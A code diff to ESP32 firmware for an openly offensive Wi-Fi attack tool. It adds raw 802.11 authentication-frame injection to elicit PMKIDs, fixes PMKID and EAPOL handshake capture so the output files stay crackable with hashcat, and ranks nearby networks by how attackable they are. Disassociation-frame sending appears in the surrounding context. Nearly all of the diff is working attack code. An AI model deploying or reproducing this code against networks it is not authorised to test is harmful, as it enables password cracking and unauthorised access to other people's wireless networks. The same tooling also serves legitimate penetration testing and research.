@@ -894,6 +894,10 @@ void OinkMode::update() {
                         if (currentChannel != targetChannel) {
                             setChannel(targetChannel);
                         }
+                        // IEEE 802.11 state machine: Auth must precede Assoc
+                        // Most APs silently drop Assoc from unauthenticated STAs
+                        sendAuthenticationRequest(targetBssid);
+                        delay(10);  // AP processes auth in <2ms; 10ms is safe margin
                         sendAssociationRequest(targetBssid, targetSSID, strlen(targetSSID));
                         pmkidProbeTime = now;
                         if (pmkidTargetIndex < 64) pmkidProbedBitset |= (1ULL << pmkidTargetIndex);
@@ -1684,15 +1688,17 @@ void OinkMode::processBeacon(const uint8_t* payload, uint16_t len, int8_t rssi) 
     }
     
     // Update hasHandshake flag in shared network data
-    int idx = findNetwork(bssid);
-    if (idx >= 0) {
-        NetworkRecon::enterCritical();
-        auto& nets = NetworkRecon::getNetworks();
-        if (idx < (int)nets.size()) {
-            nets[idx].hasHandshake = hasHandshakeFor(bssid);
+    // Lookup by BSSID inside critical section to avoid TOCTOU race with cleanupStaleNetworks
+    bool hasHs = hasHandshakeFor(bssid);
+    NetworkRecon::enterCritical();
+    auto& nets = NetworkRecon::getNetworks();
+    for (int i = 0; i < (int)nets.size(); i++) {
+        if (memcmp(nets[i].bssid, bssid, 6) == 0) {
+            nets[i].hasHandshake = hasHs;
+            break;
         }
-        NetworkRecon::exitCritical();
     }
+    NetworkRecon::exitCritical();
 }
 
 // Note: Legacy processBeacon network discovery code removed
@@ -1889,7 +1895,7 @@ void OinkMode::processEAPOL(const uint8_t* payload, uint16_t len,
             
             // Look for PMKID KDE: dd 14 00 0f ac 04 (vendor IE, IEEE OUI, PMKID type)
             // Can appear at start or within Key Data
-            for (uint16_t i = 0; i + 22 < keyDataLen; i++) {  // Strict < ensures 22 bytes remain
+            for (uint16_t i = 0; i + 22 <= keyDataLen; i++) {  // Need exactly 22 bytes for KDE
                 if (keyData[i] == 0xdd && keyData[i+1] == 0x14 &&
                     keyData[i+2] == 0x00 && keyData[i+3] == 0x0f &&
                     keyData[i+4] == 0xac && keyData[i+5] == 0x04) {
@@ -1992,23 +1998,28 @@ void OinkMode::processEAPOL(const uint8_t* payload, uint16_t len,
         }
         
         CapturedHandshake& hs = handshakes[hsIdx];
-        
+
         // Store this frame (EAPOL payload for hashcat 22000)
+        // Guard: don't overwrite an already-captured frame — retransmissions
+        // may carry a different ANonce/SNonce, producing nonce mismatch that
+        // makes the .22000/.pcap uncrackable.
         uint8_t frameIdx = messageNum - 1;
-        uint16_t copyLen = min((uint16_t)512, len);
-        memcpy(hs.frames[frameIdx].data, payload, copyLen);
-        hs.frames[frameIdx].len = copyLen;
-        hs.frames[frameIdx].messageNum = messageNum;
-        hs.frames[frameIdx].timestamp = millis();
-        hs.frames[frameIdx].rssi = rssi;
-        
-        // Store full 802.11 frame for PCAP export (radiotap + WPA-SEC compatibility)
-        uint16_t fullCopyLen = min((uint16_t)300, fullFrameLen);
-        memcpy(hs.frames[frameIdx].fullFrame, fullFrame, fullCopyLen);
-        hs.frames[frameIdx].fullFrameLen = fullCopyLen;
-        
-        // Update mask
-        hs.capturedMask |= (1 << frameIdx);
+        if (hs.frames[frameIdx].len == 0) {
+            uint16_t copyLen = min((uint16_t)512, len);
+            memcpy(hs.frames[frameIdx].data, payload, copyLen);
+            hs.frames[frameIdx].len = copyLen;
+            hs.frames[frameIdx].messageNum = messageNum;
+            hs.frames[frameIdx].timestamp = millis();
+            hs.frames[frameIdx].rssi = rssi;
+
+            // Store full 802.11 frame for PCAP export (radiotap + WPA-SEC compatibility)
+            uint16_t fullCopyLen = min((uint16_t)300, fullFrameLen);
+            memcpy(hs.frames[frameIdx].fullFrame, fullFrame, fullCopyLen);
+            hs.frames[frameIdx].fullFrameLen = fullCopyLen;
+
+            // Update mask
+            hs.capturedMask |= (1 << frameIdx);
+        }
         hs.lastSeen = millis();
         
         // Look up SSID from networks if not set (already holding NetworkRecon critical section)
@@ -2873,6 +2884,34 @@ void OinkMode::sendDisassocFrame(const uint8_t* bssid, const uint8_t* station, u
     esp_wifi_80211_tx(WIFI_IF_STA, disassocPacket, sizeof(disassocPacket), false);
 }
 
+void OinkMode::sendAuthenticationRequest(const uint8_t* bssid) {
+    // 802.11 Authentication Request (Open System) — required before Association
+    // Most APs silently drop Assoc Requests from unauthenticated STAs (IEEE 802.11 state machine)
+    uint8_t authFrame[30] = {};
+    authFrame[0] = 0xB0;  // Frame Control: Type=Management, Subtype=Authentication (0x0B)
+    authFrame[1] = 0x00;
+    // Duration
+    authFrame[2] = 0x00;
+    authFrame[3] = 0x00;
+    // Address 1: Destination (AP BSSID)
+    memcpy(authFrame + 4, bssid, 6);
+    // Address 2: Source (our MAC)
+    uint8_t ourMac[6];
+    esp_wifi_get_mac(WIFI_IF_STA, ourMac);
+    memcpy(authFrame + 10, ourMac, 6);
+    // Address 3: BSSID
+    memcpy(authFrame + 16, bssid, 6);
+    // Sequence control
+    authFrame[22] = 0x00;
+    authFrame[23] = 0x00;
+    // Auth body: Algorithm=Open System(0), Seq=1, Status=Success(0)
+    authFrame[24] = 0x00; authFrame[25] = 0x00;  // Algorithm Number: Open System
+    authFrame[26] = 0x01; authFrame[27] = 0x00;  // Authentication SEQ: 1
+    authFrame[28] = 0x00; authFrame[29] = 0x00;  // Status Code: Success
+
+    esp_wifi_80211_tx(WIFI_IF_STA, authFrame, sizeof(authFrame), false);
+}
+
 void OinkMode::sendAssociationRequest(const uint8_t* bssid, const char* ssid, uint8_t ssidLen) {
     // 802.11 Association Request for active PMKID extraction
     uint8_t assocReq[128];
@@ -3076,23 +3115,21 @@ void OinkMode::updateTargetCache() {
 }
 
 void OinkMode::sortNetworksByPriority() {
-    // Sort networks by attack priority:
+    // Sort networks by attack priority (in-place to avoid ~24KB heap copy):
     // 1. Has clients + no handshake + not PMF (highest priority)
     // 2. Weak auth (Open, WEP, WPA1) + no handshake
     // 3. WPA2 without PMF + no handshake
     // 4. Networks with handshake already (skip)
     // 5. PMF protected (can't attack)
-    
+
     bool wasBusy = oinkBusy;
     oinkBusy = true;
 
-    std::vector<DetectedNetwork> sorted;
-    NetworkRecon::enterCritical();
-    sorted = networks();
-    NetworkRecon::exitCritical();
-
     uint32_t now = millis();
-    std::sort(sorted.begin(), sorted.end(), [now](const DetectedNetwork& a, const DetectedNetwork& b) {
+
+    NetworkRecon::enterCritical();
+
+    std::sort(networks().begin(), networks().end(), [now](const DetectedNetwork& a, const DetectedNetwork& b) {
         auto getScore = [now](const DetectedNetwork& net) -> int {
             int score = computeTargetScore(net, now);
             if (net.hasHandshake) score -= 60;
@@ -3103,12 +3140,9 @@ void OinkMode::sortNetworksByPriority() {
             if (isExcluded(net.bssid)) score -= 80;
             return score;
         };
-        
+
         return getScore(a) > getScore(b);
     });
-
-    NetworkRecon::enterCritical();
-    networks().swap(sorted);
 
     // Revalidate target index after reordering
     if (targetIndex >= 0) {
